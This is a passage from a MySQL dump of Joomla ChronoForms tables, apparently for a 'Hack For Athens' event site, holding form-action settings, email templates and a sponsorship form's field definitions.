cellpadding=\"5\">\r\n<tbody>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>{}</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>{}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Organization/Business Name</strong></td>\r\n<td>{input_text_32}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Contact Email</strong></td>\r\n<td>{input_text_35}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Contact Phone</strong></td>\r\n<td>{input_text_38}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Dataset Title</strong></td>\r\n<td>{input_text_30}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Dataset URL</strong></td>\r\n<td>{input_text_19}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Format</strong></td>\r\n<td>{input_select_31}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Enter the code</strong></td>\r\n<td>{chrono_verification}</td>\r\n</tr>\r\n</tbody>\r\n</table>'),(679,2,'email',0,'{\"to\":\"\",\"cc\":\"\",\"bcc\":\"\",\"subject\":\"\",\"fromname\":\"\",\"fromemail\":\"\",\"replytoname\":\"\",\"replytoemail\":\"\",\"dto\":\"\",\"dcc\":\"\",\"dbcc\":\"\",\"dsubject\":\"\",\"dfromname\":\"\",\"dfromemail\":\"\",\"dreplytoname\":\"\",\"dreplytoemail\":\"\",\"recordip\":\"1\",\"attachments\":\"\",\"sendas\":\"html\",\"action_label\":\"\",\"encrypt_enabled\":\"0\",\"gpg_sec_key\":\"\",\"replace_nulls\":\"1\"}',11,'<p>Enter your email message content here manually or use the auto template generation button.</p>'),(680,2,'email',0,'{\"to\":\"\",\"cc\":\"\",\"bcc\":\"\",\"subject\":\"\",\"fromname\":\"\",\"fromemail\":\"\",\"replytoname\":\"\",\"replytoemail\":\"\",\"dto\":\"\",\"dcc\":\"\",\"dbcc\":\"\",\"dsubject\":\"\",\"dfromname\":\"\",\"dfromemail\":\"\",\"dreplytoname\":\"\",\"dreplytoemail\":\"\",\"recordip\":\"1\",\"attachments\":\"\",\"sendas\":\"html\",\"action_label\":\"\",\"encrypt_enabled\":\"0\",\"gpg_sec_key\":\"\",\"replace_nulls\":\"1\"}',12,'<p>Enter your email message content here manually or use the auto template generation button.</p>'),(681,2,'custom_code',1,'{\"mode\":\"controller\",\"action_label\":\"\"}',13,''),(682,2,'show_thanks_message',1,'{}',14,'<h3>Thank you for submitting your dataset information!</h3>\r\n<p><span style=\"font-size: small;\">We will be in touch with you shortly! If you have any questions or concerns and would like to contact us, <a href=\"/contact\">please click here</a>.</span></p>'),(683,2,'redirect_user',0,'{\"target_url\":\"\"}',20,''),(684,2,'debugger',0,'{\"reset_after_display\":\"0\"}',18,''),(685,3,'load_js',1,'{\"dynamic_file\":\"0\"}',0,''),(686,3,'load_css',1,'{}',1,''),(687,3,'load_captcha',1,'{\"fonts\":\"1\",\"encoded_image\":\"0\",\"refresh_button\":\"0\"}',2,''),(688,3,'show_html',1,'{}',3,''),(689,3,'event_loop',1,'{}',5,''),(690,3,'check_captcha',1,'{\"error\":\"You have entered a wrong verification code!\"}',4,''),(691,3,'event_loop',1,'{}',7,''),(692,3,'upload_files',0,'{\"files\":\"\",\"array_fields\":\"\",\"upload_path\":\"\",\"max_size\":\"1000000\",\"min_size\":\"0\",\"max_error\":\"Sorry, Your uploaded file size exceeds the allowed limit.\",\"min_error\":\"Sorry, Your uploaded file size is less than the minimum limit.\",\"type_error\":\"Sorry, Your uploaded file type is not allowed.\",\"safe_file_name\":\"1\"}',6,''),(693,3,'custom_code',1,'{\"mode\":\"controller\",\"action_label\":\"\"}',8,''),(694,3,'handle_arrays',1,'{}',16,''),(695,3,'db_save',1,'{\"table_name\":\"hfa_chronoforms_data_Challenges\",\"model_id\":\"chronoform_data\",\"save_under_modelid\":\"0\",\"params_fields\":\"\",\"ndb_enable\":\"0\",\"ndb_driver\":\"mysql\",\"ndb_host\":\"localhost\",\"ndb_user\":\"\",\"ndb_password\":\"\",\"ndb_database\":\"\",\"ndb_table_name\":\"\",\"ndb_prefix\":\"jos_\"}',9,''),(696,3,'email',1,'{\"to\":\"support@hackforathens.org\",\"cc\":\"\",\"bcc\":\"\",\"subject\":\"Sponsor Application\",\"fromname\":\"Hack For Athens\",\"fromemail\":\"support@hackforathens.org\",\"replytoname\":\"\",\"replytoemail\":\"\",\"dto\":\"\",\"dcc\":\"\",\"dbcc\":\"\",\"dsubject\":\"\",\"dfromname\":\"\",\"dfromemail\":\"\",\"dreplytoname\":\"\",\"dreplytoemail\":\"\",\"recordip\":\"1\",\"attachments\":\"attachments_13,attachments_16\",\"sendas\":\"html\",\"action_label\":\"\",\"encrypt_enabled\":\"0\",\"gpg_sec_key\":\"\",\"replace_nulls\":\"1\"}',10,'<table border=\"0\" cellspacing=\"5\" cellpadding=\"5\">\r\n<tbody>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>{}</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>{}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Organization/Business Name</strong></td>\r\n<td>{input_text_32}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Contact Email</strong></td>\r\n<td>{input_text_35}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Contact Phone</strong></td>\r\n<td>{input_text_38}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Challenge Title</strong></td>\r\n<td>{input_text_30}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Challenge Description</strong></td>\r\n<td>{input_textarea_39}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Enter the code</strong></td>\r\n<td>{chrono_verification}</td>\r\n</tr>\r\n</tbody>\r\n</table>'),(697,3,'email',0,'{\"to\":\"\",\"cc\":\"\",\"bcc\":\"\",\"subject\":\"\",\"fromname\":\"\",\"fromemail\":\"\",\"replytoname\":\"\",\"replytoemail\":\"\",\"dto\":\"\",\"dcc\":\"\",\"dbcc\":\"\",\"dsubject\":\"\",\"dfromname\":\"\",\"dfromemail\":\"\",\"dreplytoname\":\"\",\"dreplytoemail\":\"\",\"recordip\":\"1\",\"attachments\":\"\",\"sendas\":\"html\",\"action_label\":\"\",\"encrypt_enabled\":\"0\",\"gpg_sec_key\":\"\",\"replace_nulls\":\"1\"}',11,'<p>Enter your email message content here manually or use the auto template generation button.</p>'),(698,3,'email',0,'{\"to\":\"\",\"cc\":\"\",\"bcc\":\"\",\"subject\":\"\",\"fromname\":\"\",\"fromemail\":\"\",\"replytoname\":\"\",\"replytoemail\":\"\",\"dto\":\"\",\"dcc\":\"\",\"dbcc\":\"\",\"dsubject\":\"\",\"dfromname\":\"\",\"dfromemail\":\"\",\"dreplytoname\":\"\",\"dreplytoemail\":\"\",\"recordip\":\"1\",\"attachments\":\"\",\"sendas\":\"html\",\"action_label\":\"\",\"encrypt_enabled\":\"0\",\"gpg_sec_key\":\"\",\"replace_nulls\":\"1\"}',12,'<p>Enter your email message content here manually or use the auto template generation button.</p>'),(699,3,'custom_code',1,'{\"mode\":\"controller\",\"action_label\":\"\"}',13,''),(700,3,'show_thanks_message',1,'{}',14,'<h3>Thank you for submitting your challenge!</h3>\r\n<p><span style=\"font-size: small;\">We will be in touch with you shortly! If you have any questions or concerns and would like to contact us, <a href=\"/contact\">please click here</a>.</span></p>'),(701,3,'redirect_user',0,'{\"target_url\":\"\"}',20,''),(702,3,'debugger',0,'{\"reset_after_display\":\"0\"}',18,''),(721,4,'load_js',1,'{\"dynamic_file\":\"0\"}',0,''),(722,4,'load_css',1,'{}',1,''),(723,4,'load_captcha',1,'{\"fonts\":\"1\",\"encoded_image\":\"0\",\"refresh_button\":\"0\"}',2,''),(724,4,'show_html',1,'{}',3,''),(725,4,'event_loop',1,'{}',5,''),(726,4,'check_captcha',1,'{\"error\":\"You have entered a wrong verification code!\"}',4,''),(727,4,'event_loop',1,'{}',7,''),(728,4,'upload_files',0,'{\"files\":\"\",\"array_fields\":\"\",\"upload_path\":\"\",\"max_size\":\"1000000\",\"min_size\":\"0\",\"max_error\":\"Sorry, Your uploaded file size exceeds the allowed limit.\",\"min_error\":\"Sorry, Your uploaded file size is less than the minimum limit.\",\"type_error\":\"Sorry, Your uploaded file type is not allowed.\",\"safe_file_name\":\"1\"}',6,''),(729,4,'custom_code',1,'{\"mode\":\"controller\",\"action_label\":\"\"}',8,''),(730,4,'handle_arrays',1,'{}',16,''),(731,4,'db_save',1,'{\"table_name\":\"hfa_chronoforms_data_Groups\",\"model_id\":\"chronoform_data\",\"save_under_modelid\":\"0\",\"params_fields\":\"\",\"ndb_enable\":\"0\",\"ndb_driver\":\"mysql\",\"ndb_host\":\"localhost\",\"ndb_user\":\"\",\"ndb_password\":\"\",\"ndb_database\":\"\",\"ndb_table_name\":\"\",\"ndb_prefix\":\"jos_\"}',9,''),(732,4,'email',0,'{\"to\":\"support@hackforathens.org\",\"cc\":\"\",\"bcc\":\"\",\"subject\":\"Sponsor Application\",\"fromname\":\"Hack For Athens\",\"fromemail\":\"support@hackforathens.org\",\"replytoname\":\"\",\"replytoemail\":\"\",\"dto\":\"\",\"dcc\":\"\",\"dbcc\":\"\",\"dsubject\":\"\",\"dfromname\":\"\",\"dfromemail\":\"\",\"dreplytoname\":\"\",\"dreplytoemail\":\"\",\"recordip\":\"1\",\"attachments\":\"attachments_13,attachments_16\",\"sendas\":\"html\",\"action_label\":\"\",\"encrypt_enabled\":\"0\",\"gpg_sec_key\":\"\",\"replace_nulls\":\"1\"}',10,'<table border=\"0\" cellspacing=\"5\" cellpadding=\"5\">\r\n<tbody>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>{}</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>{}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Organization/Business Name</strong></td>\r\n<td>{input_text_32}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Contact Email</strong></td>\r\n<td>{input_text_35}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Contact Phone</strong></td>\r\n<td>{input_text_38}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Challenge Title</strong></td>\r\n<td>{input_text_30}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Challenge Description</strong></td>\r\n<td>{input_textarea_39}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Enter the code</strong></td>\r\n<td>{chrono_verification}</td>\r\n</tr>\r\n</tbody>\r\n</table>'),(733,4,'email',0,'{\"to\":\"\",\"cc\":\"\",\"bcc\":\"\",\"subject\":\"\",\"fromname\":\"\",\"fromemail\":\"\",\"replytoname\":\"\",\"replytoemail\":\"\",\"dto\":\"\",\"dcc\":\"\",\"dbcc\":\"\",\"dsubject\":\"\",\"dfromname\":\"\",\"dfromemail\":\"\",\"dreplytoname\":\"\",\"dreplytoemail\":\"\",\"recordip\":\"1\",\"attachments\":\"\",\"sendas\":\"html\",\"action_label\":\"\",\"encrypt_enabled\":\"0\",\"gpg_sec_key\":\"\",\"replace_nulls\":\"1\"}',11,'<p>Enter your email message content here manually or use the auto template generation button.</p>'),(734,4,'email',0,'{\"to\":\"\",\"cc\":\"\",\"bcc\":\"\",\"subject\":\"\",\"fromname\":\"\",\"fromemail\":\"\",\"replytoname\":\"\",\"replytoemail\":\"\",\"dto\":\"\",\"dcc\":\"\",\"dbcc\":\"\",\"dsubject\":\"\",\"dfromname\":\"\",\"dfromemail\":\"\",\"dreplytoname\":\"\",\"dreplytoemail\":\"\",\"recordip\":\"1\",\"attachments\":\"\",\"sendas\":\"html\",\"action_label\":\"\",\"encrypt_enabled\":\"0\",\"gpg_sec_key\":\"\",\"replace_nulls\":\"1\"}',12,'<p>Enter your email message content here manually or use the auto template generation button.</p>'),(735,4,'custom_code',1,'{\"mode\":\"controller\",\"action_label\":\"\"}',13,''),(736,4,'show_thanks_message',1,'{}',14,'<h3>Thank you for submitting your challenge!</h3>\r\n<p><span style=\"font-size: small;\">We will be in touch with you shortly! If you have any questions or concerns and would like to contact us, <a href=\"/contact\">please click here</a>.</span></p>'),(737,4,'redirect_user',0,'{\"target_url\":\"\"}',20,''),(738,4,'debugger',0,'{\"reset_after_display\":\"0\"}',18,''),(955,1,'load_js',1,'{\"dynamic_file\":\"0\"}',0,''),(956,1,'load_css',1,'{}',1,''),(957,1,'load_captcha',1,'{\"fonts\":\"1\",\"encoded_image\":\"0\",\"refresh_button\":\"0\"}',2,''),(958,1,'show_html',1,'{}',3,''),(959,1,'event_loop',1,'{}',5,''),(960,1,'check_captcha',1,'{\"error\":\"You have entered a wrong verification code!\"}',4,''),(961,1,'event_loop',1,'{}',7,''),(962,1,'upload_files',0,'{\"files\":\"\",\"array_fields\":\"\",\"upload_path\":\"\",\"max_size\":\"1000000\",\"min_size\":\"0\",\"max_error\":\"Sorry, Your uploaded file size exceeds the allowed limit.\",\"min_error\":\"Sorry, Your uploaded file size is less than the minimum limit.\",\"type_error\":\"Sorry, Your uploaded file type is not allowed.\",\"safe_file_name\":\"1\"}',6,''),(963,1,'custom_code',1,'{\"mode\":\"controller\",\"action_label\":\"\"}',8,''),(964,1,'handle_arrays',1,'{}',16,''),(965,1,'db_save',1,'{\"table_name\":\"hfa_chronoforms_data_Sponsorship\",\"model_id\":\"chronoform_data\",\"save_under_modelid\":\"0\",\"params_fields\":\"\",\"ndb_enable\":\"0\",\"ndb_driver\":\"mysql\",\"ndb_host\":\"localhost\",\"ndb_user\":\"\",\"ndb_password\":\"\",\"ndb_database\":\"\",\"ndb_table_name\":\"\",\"ndb_prefix\":\"jos_\"}',9,''),(966,1,'email',1,'{\"to\":\"support@hackforathens.org\",\"cc\":\"\",\"bcc\":\"\",\"subject\":\"Sponsor Application\",\"fromname\":\"Hack For Athens\",\"fromemail\":\"support@hackforathens.org\",\"replytoname\":\"\",\"replytoemail\":\"\",\"dto\":\"\",\"dcc\":\"\",\"dbcc\":\"\",\"dsubject\":\"\",\"dfromname\":\"\",\"dfromemail\":\"\",\"dreplytoname\":\"\",\"dreplytoemail\":\"\",\"recordip\":\"1\",\"attachments\":\"attachments_13,attachments_16\",\"sendas\":\"html\",\"action_label\":\"\",\"encrypt_enabled\":\"0\",\"gpg_sec_key\":\"\",\"replace_nulls\":\"1\"}',10,'<table border=\"0\" cellspacing=\"5\" cellpadding=\"5\">\r\n<tbody>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>{}</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>{}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Organization/Business Name</strong></td>\r\n<td>{organization}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Contact Email</strong></td>\r\n<td>{email}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Contact Phone</strong></td>\r\n<td>{phone}</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>{}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Sponsor Level</strong></td>\r\n<td>{sponsorship_level}</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Enter the code</strong></td>\r\n<td>{chrono_verification}</td>\r\n</tr>\r\n</tbody>\r\n</table>'),(967,1,'email',0,'{\"to\":\"\",\"cc\":\"\",\"bcc\":\"\",\"subject\":\"\",\"fromname\":\"\",\"fromemail\":\"\",\"replytoname\":\"\",\"replytoemail\":\"\",\"dto\":\"\",\"dcc\":\"\",\"dbcc\":\"\",\"dsubject\":\"\",\"dfromname\":\"\",\"dfromemail\":\"\",\"dreplytoname\":\"\",\"dreplytoemail\":\"\",\"recordip\":\"1\",\"attachments\":\"\",\"sendas\":\"html\",\"action_label\":\"\",\"encrypt_enabled\":\"0\",\"gpg_sec_key\":\"\",\"replace_nulls\":\"1\"}',11,'<p>Enter your email message content here manually or use the auto template generation button.</p>'),(968,1,'email',0,'{\"to\":\"\",\"cc\":\"\",\"bcc\":\"\",\"subject\":\"\",\"fromname\":\"\",\"fromemail\":\"\",\"replytoname\":\"\",\"replytoemail\":\"\",\"dto\":\"\",\"dcc\":\"\",\"dbcc\":\"\",\"dsubject\":\"\",\"dfromname\":\"\",\"dfromemail\":\"\",\"dreplytoname\":\"\",\"dreplytoemail\":\"\",\"recordip\":\"1\",\"attachments\":\"\",\"sendas\":\"html\",\"action_label\":\"\",\"encrypt_enabled\":\"0\",\"gpg_sec_key\":\"\",\"replace_nulls\":\"1\"}',12,'<p>Enter your email message content here manually or use the auto template generation button.</p>'),(969,1,'custom_code',1,'{\"mode\":\"controller\",\"action_label\":\"\"}',13,''),(970,1,'show_thanks_message',1,'{}',14,'<h3>Thank you for submitting your sponsorship information! To make your Sponsorship Payment, <a href=\"/sponsor-payment\">please click here</a>.</h3>'),(971,1,'redirect_user',0,'{\"target_url\":\"\"}',20,''),(972,1,'debugger',0,'{\"reset_after_display\":\"0\"}',18,'');
/*!40000 ALTER TABLE `hfa_chronoform_actions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_chronoforms`
--

DROP TABLE IF EXISTS `hfa_chronoforms`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_chronoforms` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `form_type` tinyint(1) NOT NULL,
  `content` longtext NOT NULL,
  `wizardcode` longtext,
  `events_actions_map` longtext,
  `params` longtext NOT NULL,
  `published` tinyint(1) NOT NULL DEFAULT '1',
  `app` varchar(100) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_chronoforms`
--

LOCK TABLES `hfa_chronoforms` WRITE;
/*!40000 ALTER TABLE `hfa_chronoforms` DISABLE KEYS */;
INSERT INTO `hfa_chronoforms` VALUES (1,'Sponsorship',1,'<fieldset class=\"cf_container ccms_form_element box2 title4\" id=\"cf_container_2\"><legend>Sponsor Information</legend><div class=\"ccms_form_element cfdiv_text\" id=\"organization1_container_div\" style=\"\"><label>Organization/Business Name</label><input maxlength=\"150\" size=\"30\" class=\" validate[\'required\']\" title=\"\" type=\"text\" value=\"\" name=\"organization\" />\n<div class=\"clear\"></div><div id=\"error-message-organization\"></div></div><div class=\"ccms_form_element cfdiv_text\" id=\"email1_container_div\" style=\"\"><label>Contact Email</label><input maxlength=\"150\" size=\"30\" class=\" validate[\'required\',\'email\']\" title=\"\" type=\"text\" value=\"\" name=\"email\" />\n<div class=\"clear\"></div><div id=\"error-message-email\"></div></div><div class=\"ccms_form_element cfdiv_text\" id=\"phone1_container_div\" style=\"\"><label>Contact Phone</label><input maxlength=\"150\" size=\"30\" class=\" validate[\'required\',\'phone\']\" title=\"\" type=\"text\" value=\"\" name=\"phone\" />\n<div class=\"clear\"></div><div id=\"error-message-phone\"></div></div></fieldset><fieldset class=\"cf_container ccms_form_element \" id=\"cf_container_24\"><legend>Sponsorship</legend><div class=\"ccms_form_element cfdiv_radio\" id=\"sponsorship_level1_container_div\" style=\"\"><label>Sponsor Level</label><input type=\"hidden\" name=\"sponsorship_level\" value=\"\" alt=\"ghost\" />\n<div style=\"float:left; clear:none;\"><input type=\"radio\" name=\"sponsorship_level\" id=\"sponsorship_level_0\" title=\"\" value=\"Boostrap\" class=\"\" />\n<label for=\"sponsorship_level_0\">Bootstrap</label>\n<input type=\"radio\" name=\"sponsorship_level\" id=\"sponsorship_level_1\" title=\"\" value=\"Angel\" class=\"\" />\n<label for=\"sponsorship_level_1\">Angel</label>\n<input type=\"radio\" name=\"sponsorship_level\" id=\"sponsorship_level_2\" title=\"\" value=\"Venture\" class=\"\" />\n<label for=\"sponsorship_level_2\">Venture</label>\n</div><div class=\"clear\"></div><div id=\"error-message-sponsorship_level\"></div></div></fieldset><div class=\"ccms_form_element cfdiv_text\" id=\"chrono_verification1_container_div\" style=\"\"><label>Enter the code</label><input maxlength=\"5\" size=\"5\" class=\"chrono_captcha_input\" title=\"\" type=\"text\" value=\"\" name=\"chrono_verification\" />\n{chronocaptcha_img}<div class=\"clear\"></div><div id=\"error-message-chrono_verification\"></div></div><div class=\"ccms_form_element cfdiv_submit\" id=\"input_submit_61_container_div\" style=\"text-align:left\"><input name=\"input_submit_6\" class=\"\" value=\"Submit\" type=\"submit\" />\n<div class=\"clear\"></div><div id=\"error-message-input_submit_6\"></div></div>','array (\n  \'field_1\' => \n  array (\n    \'input_container_1_area_label\' => \'Sponsorhip\',\n    \'input_container_1_collapsed\' => \'0\',\n    \'input_container_1_container_type\' => \'\',\n    \'input_container_1_container_class\' => \'box2 title4\',\n    \'input_container_1_start_code\' => \'\',\n    \'input_container_1_end_code\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'container\',\n    \'container_id\' => \'0\',\n  ),\n  \'field_2\' => \n  array (\n    \'input_container_2_area_label\' => \'Sponsor Information\',\n    \'input_container_2_collapsed\' => \'0\',\n    \'input_container_2_container_type\' => \'fieldset\',\n    \'input_container_2_container_class\' => \'box2 title4\',\n    \'input_container_2_start_code\' => \'\',\n    \'input_container_2_end_code\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'container\',\n    \'container_id\' => \'1\',\n  ),\n  \'field_4\' => \n  array (\n    \'input_text_4_input_id\' => \'\',\n    \'input_text_4_label_text\' => \'Organization/Business Name\',\n    \'input_text_4_input_name\' => \'organization\',\n    \'input_text_4_input_value\' => \'\',\n    \'input_text_4_input_maxlength\' => \'150\',\n    \'input_text_4_input_size\' => \'30\',\n    \'input_text_4_input_class\' => \'\',\n    \'input_text_4_input_title\' => \'\',\n    \'input_text_4_label_over\' => \'0\',\n    \'input_text_4_hide_label\' => \'0\',\n    \'input_text_4_multiline_start\' => \'0\',\n    \'input_text_4_multiline_add\' => \'0\',\n    \'input_text_4_validations\' => \'required\',\n    \'input_text_4_instructions\' => \'\',\n    \'input_text_4_tooltip\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'text\',\n    \'container_id\' => \'2\',\n  ),\n  \'field_30\' => \n  array (\n    \'input_text_30_input_id\' => \'\',\n    \'input_text_30_label_text\' => \'Contact Email\',\n    \'input_text_30_input_name\' => \'email\',\n    \'input_text_30_input_value\' => \'\',\n    \'input_text_30_input_maxlength\' => \'150\',\n    \'input_text_30_input_size\' => \'30\',\n    \'input_text_30_input_class\' => \'\',\n    \'input_text_30_input_title\' => \'\',\n    \'input_text_30_label_over\' => \'0\',\n    \'input_text_30_hide_label\' => \'0\',\n    \'input_text_30_multiline_start\' => \'0\',\n    \'input_text_30_multiline_add\' => \'0\',\n    \'input_text_30_validations\' => \'required,email\',\n    \'input_text_30_instructions\' => \'\',\n    \'input_text_30_tooltip\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'text\',\n    \'container_id\' => \'2\',\n  ),\n  \'field_33\' => \n  array (\n    \'input_text_33_input_id\' => \'\',\n    \'input_text_33_label_text\' => \'Contact Phone\',\n    \'input_text_33_input_name\' => \'phone\',\n    \'input_text_33_input_value\' => \'\',\n    \'input_text_33_input_maxlength\' => \'150\',\n    \'input_text_33_input_size\' => \'30\',\n    \'input_text_33_input_class\' => \'\',\n    \'input_text_33_input_title\' => \'\',\n    \'input_text_33_label_over\' => \'0\',\n    \'input_text_33_hide_label\' => \'0\',\n    \'input_text_33_multiline_start\' => \'0\',\n    \'input_text_33_multiline_add\' => \'0\',\n    \'input_text_33_validations\' => \'required,phone\',\n    \'input_text_33_instructions\' => \'\',\n    \'input_text_33_tooltip\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'text\',\n    \'container_id\' => \'2\',\n  ),\n  \'field_24\' => \n  array (\n    \'input_container_24_area_label\' => \'Sponsorship\',\n    \'input_container_24_collapsed\' => \'0\',\n    \'input_container_24_container_type\' => \'fieldset\',\n    \'input_container_24_container_class\' => \'\',\n    \'input_container_24_start_code\' => \'\',\n    \'input_container_24_end_code\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'container\',\n    \'container_id\' => \'1\',\n  ),\n  \'field_29\' => \n  array (\n    \'input_radio_29_input_id\' => \'\',\n    \'input_radio_29_label_text\' => \'Sponsor Level\',\n    \'input_radio_29_input_name\' => \'sponsorship_level\',\n    \'input_radio_29_input_value\' => \'\',\n    \'input_radio_29_radios_over\' => \'0\',\n    \'input_radio_29_legend\' => \'\',\n    \'input_radio_29_ghost\' => \'1\',\n    \'input_radio_29_ghost_value\' => \'\',\n    \'input_radio_29_input_title\' => \'\',\n    \'input_radio_29_label_over\' => \'0\',\n    \'input_radio_29_hide_label\' => \'0\',\n    \'input_radio_29_multiline_start\' => \'0\',\n    \'input_radio_29_multiline_add\' => \'0\',\n    \'input_radio_29_enable_dynamic_data\' => \'0\',\n    \'input_radio_29_data_path\' => \'\',\n    \'input_radio_29_value_key\' => \'\',\n    \'input_radio_29_text_key\' => \'\',\n    \'input_radio_29_options\' => \'Boostrap=Bootstrap\r\nAngel=Angel\r\nVenture=Venture\',\n    \'input_radio_29_validations\' => \'\',\n    \'input_radio_29_instructions\' => \'\',\n    \'input_radio_29_tooltip\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'radio\',\n    \'container_id\' => \'24\',\n  ),\n  \'field_5\' => \n  array (\n    \'input_captcha_5_input_id\' => \'\',\n    \'input_captcha_5_label_text\' => \'Enter the code\',\n    \'input_captcha_5_input_name\' => \'chrono_verification\',\n    \'input_captcha_5_input_value\' => \'\',\n    \'input_captcha_5_input_maxlength\' => \'5\',\n    \'input_captcha_5_input_size\' => \'5\',\n    \'input_captcha_5_input_class\' => \'chrono_captcha_input\',\n    \'input_captcha_5_input_title\' => \'\',\n    \'input_captcha_5_label_over\' => \'0\',\n    \'input_captcha_5_hide_label\' => \'0\',\n    \'input_captcha_5_validations\' => \'\',\n    \'input_captcha_5_instructions\' => \'\',\n    \'input_captcha_5_tooltip\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'captcha\',\n    \'real_type\' => \'text\',\n    \'after\' => \'{chronocaptcha_img}\',\n    \'container_id\' => \'0\',\n  ),\n  \'field_6\' => \n  array (\n    \'input_submit_6_input_id\' => \'\',\n    \'input_submit_6_input_name\' => \'input_submit_6\',\n    \'input_submit_6_input_value\' => \'Submit\',\n    \'input_submit_6_input_class\' => \'\',\n    \'input_submit_6_button_type\' => \'submit\',\n    \'input_submit_6_button_align\' => \'left\',\n    \'input_submit_6_back_button\' => \'0\',\n    \'input_submit_6_reset_button\' => \'0\',\n    \'input_submit_6_back_button_value\' => \'Back\',\n    \'input_submit_6_reset_button_value\' => \'Reset\',\n    \'input_submit_6_multiline_start\' => \'0\',\n    \'input_submit_6_multiline_add\' => \'0\',\n    \'tag\' => \'input\',\n    \'type\' => \'submit\',\n    \'container_id\' => \'0\',\n  ),\n)','YToxOntzOjY6ImV2ZW50cyI7YToyOntzOjQ6ImxvYWQiO2E6MTp7czo3OiJhY3Rpb25zIjthOjQ6e3M6MTg6ImNmYWN0aW9uX2xvYWRfanNfMCI7czowOiIiO3M6MTk6ImNmYWN0aW9uX2xvYWRfY3NzXzEiO3M6MDoiIjtzOjIzOiJjZmFjdGlvbl9sb2FkX2NhcHRjaGFfMiI7czowOiIiO3M6MjA6ImNmYWN0aW9uX3Nob3dfaHRtbF8zIjtzOjA6IiI7fX1zOjY6InN1Ym1pdCI7YToxOntzOjc6ImFjdGlvbnMiO2E6MTI6e3M6MjQ6ImNmYWN0aW9uX2NoZWNrX2NhcHRjaGFfNCI7YToxOntzOjY6ImV2ZW50cyI7YToyOntzOjM3OiJjZmFjdGlvbmV2ZW50X2NoZWNrX2NhcHRjaGFfNF9zdWNjZXNzIjtzOjA6IiI7czozNDoiY2ZhY3Rpb25ldmVudF9jaGVja19jYXB0Y2hhXzRfZmFpbCI7YToxOntzOjc6ImFjdGlvbnMiO2E6MTp7czoyMToiY2ZhY3Rpb25fZXZlbnRfbG9vcF81IjtzOjA6IiI7fX19fXM6MjM6ImNmYWN0aW9uX3VwbG9hZF9maWxlc182IjthOjE6e3M6NjoiZXZlbnRzIjthOjI6e3M6MzY6ImNmYWN0aW9uZXZlbnRfdXBsb2FkX2ZpbGVzXzZfc3VjY2VzcyI7czowOiIiO3M6MzM6ImNmYWN0aW9uZXZlbnRfdXBsb2FkX2ZpbGVzXzZfZmFpbCI7YToxOntzOjc6ImFjdGlvbnMiO2E6MTp7czoyMToiY2ZhY3Rpb25fZXZlbnRfbG9vcF83IjtzOjA6IiI7fX19fXM6MjI6ImNmYWN0aW9uX2N1c3RvbV9jb2RlXzgiO3M6MDoiIjtzOjI1OiJjZmFjdGlvbl9oYW5kbGVfYXJyYXlzXzE2IjtzOjA6IiI7czoxODoiY2ZhY3Rpb25fZGJfc2F2ZV85IjtzOjA6IiI7czoxNzoiY2ZhY3Rpb25fZW1haWxfMTAiO3M6MDoiIjtzOjE3OiJjZmFjdGlvbl9lbWFpbF8xMSI7czowOiIiO3M6MTc6ImNmYWN0aW9uX2VtYWlsXzEyIjtzOjA6IiI7czoyMzoiY2ZhY3Rpb25fY3VzdG9tX2NvZGVfMTMiO3M6MDoiIjtzOjMxOiJjZmFjdGlvbl9zaG93X3RoYW5rc19tZXNzYWdlXzE0IjtzOjA6IiI7czoyNToiY2ZhY3Rpb25fcmVkaXJlY3RfdXNlcl8yMCI7czowOiIiO3M6MjA6ImNmYWN0aW9uX2RlYnVnZ2VyXzE4IjtzOjA6IiI7fX19fQ==','{\"form_mode\":\"easy\",\"form_method\":\"post\",\"auto_detect_settings\":\"1\",\"load_files\":\"2\",\"tight_layout\":\"0\",\